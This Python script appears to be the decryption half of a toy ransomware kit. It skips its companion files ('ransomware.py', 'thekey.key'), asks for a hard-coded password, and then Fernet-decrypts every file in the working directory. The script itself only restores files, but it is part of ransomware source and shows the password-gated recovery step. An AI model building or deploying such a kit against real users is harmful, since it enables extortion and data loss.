#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decryption.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

password = "TUMMIFTW"
userInput = input("What is the password?\n")

if userInput == password:
    print("Your files have been decrypted.")
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()

        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
else:
    print("Nope.")